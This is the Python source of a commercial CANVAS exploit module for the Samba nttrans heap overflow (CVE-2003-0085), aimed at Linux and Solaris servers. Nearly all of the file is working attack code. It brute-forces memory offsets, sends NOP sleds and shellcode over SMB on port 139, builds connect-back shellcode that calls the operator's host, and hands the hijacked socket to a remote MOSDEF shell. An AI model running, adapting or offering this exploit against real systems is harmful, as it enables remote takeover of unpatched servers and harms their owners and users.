#! /usr/bin/env python
"""

SAMBA nttrans AnyWhere! Overflow

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"

CHANGES="""


"""


notes="""
tested on:
    Red Hat Linux release 8.0 (Psyche): samba-2.2.7-4.8.0.rpm kernel: 2.4.18-14
    Red Hat 7.3 samba 2.2.3a: samba-2.2.3a-6.rpm
    Red Hat Linux release 7.2 (Enigma): samba-2.2.1a-4.rpm kernel: 2.4.7-10
    Red Hat Linux release 7.1 (Seawolf): samba-2.0.7-36
    Mandrake Linux release 8.2 (Bluebird) for i586: samba-2.2.3a-10mdk kernel: 2.4.18-6mdk
"""

#http://www.immunityinc.com/CANVAS/
#Author: sinan.eren@immunityinc.com
#

import os,getopt
import sys


sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import socket
from exploitutils import *
import addencoder
import time
from tcpexploit import tcpexploit
import urllib
#samba stuff
from samba_client import SAMBAClient
from samba_client import SAMBAException
import smb
import nmb
import struct

import canvasengine
from shelllistener import shelllistener
from shelllistener import shellfromtelnet
import linuxshell
from libs.ctelnetlib import Telnet

import mosdef
from linuxNode import linuxNode
import linuxMosdefShellServer

NAME="samba_nttrans"
#TODO: FIX THESE
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Samba"
DOCUMENTATION["Date public"]="Mar 15, 2003"
DOCUMENTATION["CERT Advisory"]="N/A"
DOCUMENTATION["CVE Name"] = "CVE-2003-0085"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0085"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]="http://www.samba.org/samba/whatsnew/samba-2.2.8.html"
DOCUMENTATION["Development Notes"]="WARNING! This exploit can get you more than one shell-listener because of the fast brute force routine.\n"+\
             "You might choose to kill the extra listeners from Listeners menu but it is not a necessity."
DOCUMENTATION["Versions Tested"] = "\nSolaris 8 sun4u samba-2.2.2-sol8-sparc-local.gz (sunfreeware.com)\n"+\
             "Solaris 8 sun4u samba-2.2.7a-sol8-sparc-local.gz (sunfreeware.com)\n"+\
             "Solaris 2.6 sun4u samba-2.2.7a-sol8-sparc-local.gz (sunfreeware.com)\n"+\
             "Red Hat Linux release 8.0 (Psyche): samba-2.2.7-4.8.0.rpm kernel: 2.4.18-14\n"+\
             "Red Hat Linux release 7.3 x86 samba 2.2.3a: samba-2.2.3a-6.rpm\n"+\
             "Red Hat Linux release 7.2 (Enigma): samba-2.2.1a-4.rpm kernel: 2.4.7-10\n"+\
             "Red Hat Linux release 7.1 (Seawolf): samba-2.0.7-36\n"+\
             "Mandrake Linux release 8.2 (Bluebird) x586:samba-2.2.3a-10mdk.rpm"

DESCRIPTION="Samba Nttrans Overflow"

VERSION="1.0"

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Linux"], ["Solaris"] ]

class SAMBAnttrans_Linux(tcpexploit):
    def __init__(self):
        pass
    
    def attack_linux(self):
        
        padd = 4 - (len(self.shellcode) % 4)
        shcode = self.shellcode + padd*"A"
        print "shcode len: %d\n" % len(shcode)
        x86_nop = "\x42"
        stack_end = 0xc0000000L
        #killer_indx = [0xb7dc4680L, 0xb7def7d4L, 0xb7dd4170L, 0xb7df0e38L, 0xb7e04e90L, 0xb7e7dab0L, 0xb7ea4af0L]
        killer_indx = [0xb7de0000L, 0xb7dd0000L, 0xb7dc0000L, 0xb7df0000L, 0xb7e7dab0L, 0xb7ea4af0L]
        #killer_indx -= total_sz
        indx_delta = 64
        #killer_indx -= indx_delta
        trycnt = 128
        
        ovw_len = 0x100 # dwords of overwrite
        
        for each in killer_indx:

            print "[!] switching delta to %X"% each

            for sub_indx in range(0, 0xff00, ovw_len): # not * 4, sensible small step based off of ovw_len dwords
                
                sh_addr = stack_end - len(shcode) - 0x500
                
                # XXX: somewhat more sensible payload calc, we hit stack end
                # when we have a 'succesful' hit, so we need to just sort of slide
                # our payload calc based off of the stack end, so take smaller steps
                # and be a bit more sensitive.
                
                self.log("trying indx: 0x%.8x, jmp_addr: 0x%.8x" % (each, sh_addr)) # XXX: top of stack - size - index
                #raw_input("attach")
                try:
                    self.mysmbclient.do_smb_nttrans_first()
                    self.mysmbclient.do_smb_nttrans_second(each, struct.pack("<L", sh_addr) * ovw_len + x86_nop * 0x600 + shcode)
                except Exception, msg:
                    self.log("%s" % msg)
                    import traceback
                    print '-'*60
                    traceback.print_exc(file=sys.stdout)
                    print '-'*60
        
                time.sleep(0.1)
                
                sck = self.mysmbclient.get_sock()
    
                #if linuxshell.doGOhandshake(sck):
                try:
                    buf = sck.recv(1000)
                except:
                    continue
  
                if buf.find("G") != -1:
                    sck.send("O")
                    node = linuxNode()
                    node.parentnode = self.socknode
                    linuxMosdefShellServer.linuxshellserver(sck, node, logfunction=self.logfunction)
                    self.log("Calling startup for MOSDEF shell server")
                    node.startup()
                    self.setInfo("%s attacking %s:%d (succeeded)"% (NAME, self.host, self.port))
                    return node
                
                try:
                    self.setup()            
                except Exception, msg:
                    self.log("%s" % msg)

                #each -= total_sz
                each += ovw_len

        return None

                
class SAMBAnttrans_Solaris(tcpexploit):
    def __init__(self):
        pass
    
    def attack_solaris(self):
        
        sparc_nop = "\xa4\x1c\x40\x11"
        killer_indx = 0xfff30000L #0xfff39328
        trycnt = 128
        
        while trycnt:
            #make sure ...
            if self.ISucceeded():
                self.log("Success!")
                return 1
            
            self.log("trying indx: 0x%.8x, cnt: %d" % (killer_indx, trycnt))
            #raw_input("attach")
            try:
                self.mysmbclient.do_smb_nttrans_first()
                self.mysmbclient.do_smb_nttrans_second(killer_indx, sparc_nop*0x2000 + self.shellcode)
            except Exception, msg:
                self.log("%s" % msg)
                
            time.sleep(1)
            
            if self.ISucceeded():
                self.log("Success!")
                self.setInfo("%s attacking %s:%d (succeeded)"%(NAME,self.host,self.port))
                return 1
            
            killer_indx += 0x2000
            trycnt -= 1
            try:
                self.setup()            
            except Exception, msg:
                self.log("%s" % msg)

class theexploit(tcpexploit, SAMBAnttrans_Solaris, SAMBAnttrans_Linux):
    def __init__(self):
        tcpexploit.__init__(self)
        self.mysmbclient = SAMBAClient()
        self.mysmbclient.__init__()
        self.setPort(139)
        self.setHost("")
        self.setVersion(0)
        self.badstring="\x00\\/.:?\r\n%?"
        self.user=None
        self.password=None
        self.name=NAME
        return
    
    def createShellcode(self):
        if not self.version:
            localhost = self.callback.ip
            localport = self.callback.port
            print "Calling back to %s:%s" % (localhost, localport)
            return self.createSparcShellcode(self.badstring, localhost, localport)
        else:
            return self.createLinuxGOShellcode(self.badstring)
            
    def neededListenerTypes(self):
        if not self.version:
            return [canvasengine.SOLARISSPARCMOSDEF]
        else:
            return []

    def test(self):
        self.port=int(self.argsDict.get("port",self.port))
        self.host=self.target.interface
        try:
            self.mysmbclient.do_smb_connect(self.host, self.user, self.password)
            remote_ver = self.mysmbclient.get_lanman_version()
            sck = self.mysmbclient.get_sock()
            if remote_ver.find("Samba") == -1:
                sck.close()
                return 0
            try:
                self.log("Version: %s" % remote_ver)
                #Samba 2.2.7
                name, ver = remote_ver.split("\x20") 
                major, med, minor = ver.split(".")
                #print name, ver
                #print major, med, minor
                
                #FIX for 2.2.7a
                #a, b = minor[0], minor[1]
                
                if int(major) < 3 and int(med) < 3 and int(minor[0]) < 8:
                    sck.close()
                    return 1
                else:
                    sck.close()
                    return 0
            except:
                print "problem in version parsing ..."
                #if something goes wrong on parsing return vulnerable,
                #so that it can be verified manually. 
                sck.close()
                return 1
        except:
            return 0
    
    def run(self):
        self.port=int(self.argsDict.get("port",self.port))
        self.host=self.target.interface
        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))

        self.socknode = self.argsDict["passednodes"][0]        

        self.test()
        
        try:
            self.setup()
        except Exception, msg:
            self.log("%s" % str(msg))
            self.setInfo("%s attacking %s:%d (failed)"%(NAME,self.host,self.port))
            return 0

        if not self.version:
            SAMBAnttrans_Solaris.__init__(self)
            self.attack_solaris()
        else:
            SAMBAnttrans_Linux.__init__(self)
            return self.attack_linux()
                        
    def setup(self):
        try:
            self.mysmbclient.do_smb_connect(self.host, self.user, self.password) 
        except smb.SessionError, err:
            raise SAMBAException, "SAMBAExploit, Host: " + str(self.host) + " " + str(err)
        except Exception, msg:
            #self.log("Could not connect...")
            raise SAMBAException, str(msg)
        return 1
    
    def displayVersions(self):
        print "1 - Solaris 7 & 8 Brute Force (connectback use -l -d options)"
        print "2 - Linux Brute Force (steal socket shellcode ignores -l and -d options)"
        return
        
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
